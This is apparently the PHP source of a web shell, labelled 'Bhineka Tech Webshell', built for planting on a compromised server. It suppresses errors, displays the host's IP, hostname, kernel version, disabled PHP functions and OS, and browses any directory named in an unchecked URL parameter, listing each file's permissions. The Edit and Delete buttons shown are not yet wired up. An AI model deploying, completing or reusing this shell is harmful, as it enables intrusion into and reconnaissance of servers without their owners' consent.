<?php

error_reporting(0);

function info() {
  $arr = [
    'ip' => $_SERVER['REMOTE_ADDR'],
    'host' => gethostname(),
    'kernel' => php_uname(),
    'disablefunc' => ini_get('disable_functions'),
    'path' => getcwd(),
    'os' => PHP_OS,
  ];  

  return $arr;
} 
$getInfo = info();

function replace($arg) {
  $os = $arg;

  $replace = str_replace('\\', '/', $os);
  return $replace;
}

function cekPermission($filenya) {

  $perms = fileperms($filenya);
  switch ($perms & 0xF000) {
    case 0xC000: // socket
        $info = 's';
        break;
    case 0xA000: // symbolic link
        $info = 'l';
        break;
    case 0x8000: // regular
        $info = '-';
        break;
    case 0x6000: // block special
        $info = 'b';
        break;
    case 0x4000: // directory
        $info = 'd';
        break;
    case 0x2000: // character special
        $info = 'c';
        break;
    case 0x1000: // FIFO pipe
        $info = 'p';
        break;
    default: 
        $info = 'u';
}

      //Untuk Owner
      $info .= (($perms & 0x0100) ? 'r' : '-');
      $info .= (($perms & 0x0080) ? 'w' : '-');
      $info .= (($perms & 0x0040) ?
                  (($perms & 0x0800) ? 's' : 'x' ) :
                  (($perms & 0x0800) ? 'S' : '-'));

      //Untuk Group
      $info .= (($perms & 0x0020) ? 'r' : '-');
      $info .= (($perms & 0x0010) ? 'w' : '-');
      $info .= (($perms & 0x0008) ?
                  (($perms & 0x0400) ? 's' : 'x' ) :
                  (($perms & 0x0400) ? 'S' : '-'));

      //Untuk Other
      $info .= (($perms & 0x0004) ? 'r' : '-');
      $info .= (($perms & 0x0002) ? 'w' : '-');
      $info .= (($perms & 0x0001) ?
                  (($perms & 0x0200) ? 't' : 'x' ) :
                  (($perms & 0x0200) ? 'T' : '-'));

      return $info;
}

if(strtoupper(substr($getInfo['os'], 0, 3)) == 'WIN') {
  $getInfo['os'] = 'Windows';
}else if(strtoupper(substr($getInfo['os'], 0, 3)) == 'LIN') {
  $getInfo['os'] = 'Linux';
}

$pecah = explode('/', replace($getInfo['path']));

for($i = 0; $i < count($pecah); $i++) {
      $k = $i+1;
      @$paths[$i] .= $paths[$i-1] . $pecah[$i] . '/';
}


if(isset($_GET['path'])) {
  $dir = $_GET['path'];
  @$listDir = scandir($dir);

  $dipecah = explode('/', $dir);
  $getPath = [];
  for($i = 0; $i < count($dipecah) - 1; $i++) {
      $k = $i+1;
      @$getPath[$i] .= $getPath[$i-1] . $dipecah[$i] . '/';
    }
}else {
  $listDir = scandir(getcwd());
}


?>
<!DOCTYPE html>
<html>
  <head>
    <!--Import Google Icon Font-->
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
    <!--Import materialize.css-->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/css/materialize.min.css">
    <!--Let browser know website is optimized for mobile-->
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  </head>
  <style type="text/css">
    .info {
      display: block;
    }
    td .waves-effect {
      margin: 2px;
    }

    nav {
        background-color: #42a5f5;
    }
  </style>
  <body>

    <nav>
      <div class="container">
    <div class="nav-wrapper">
      <a href="#" class="brand-logo center">Bhineka Tech Webshell</a>
    </div>
    </div>
  </nav>

    <div class="container" style="margin-top: 30px;">
        <b class="info">IP : <?= $getInfo['ip']; ?></b>
        <b class="info">Hostname : <?= $getInfo['host']; ?></b>
        <b class="info">Kernel : <?= $getInfo['kernel']; ?></b>
        <b class="info">Disable Function : <?= empty($getInfo['disablefunc']) ? 'None :)  ' : $getInfo['disablefunc']; ?></b>
        <b class="info">OS : <?= $getInfo['os']; ?></b>

        PATH :
        <?php if(isset($_GET['path'])): ?> 
          <?php $i = 0; foreach($getPath as $path): ?> <a href="?path=<?= $path; ?>"><?php if($i == count($getPath)){ break; }else{ echo $getPath[$i++]; } ?></a> <?php endforeach; ?>
        <?php else: ?>
          <?php $i = 0; foreach($pecah as $pe): ?> <a href="?path=<?= $paths[$i++]; ?>"><?= $pe; ?></a>/ <?php endforeach; ?>
        <?php endif; ?>
    </div>

    <div class="container">
        <table>
        <thead>
          <tr>
              <th>Nama</th>
              <th>Type</th>
              <th>Permission</th>
              <th>Action</th>
          </tr>
        </thead>
        <tbody>

          <?php foreach($listDir as $list): ?>
          <tr>
            <td><a href="?path=<?= isset($_GET['path']) ? $_GET['path'] . $list : $getInfo['path'] . '\\' . $list; ?>"><?= $list; ?></a></td>
            <td><?= is_dir($list) ? "Folder" : "Files"; ?></td>
            <td><?= cekPermission($list); ?></td>
            <td><a class="waves-effect waves-light btn-small">Edit</a><a class="waves-effect waves-light red btn-small">Delete</a></td>
          </tr> 
          <?php endforeach; ?>
        </tbody>
      </table>

    </div>
    <!--JavaScript at end of body for optimized loading-->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/js/materialize.min.js"></script>
  </body>
</html>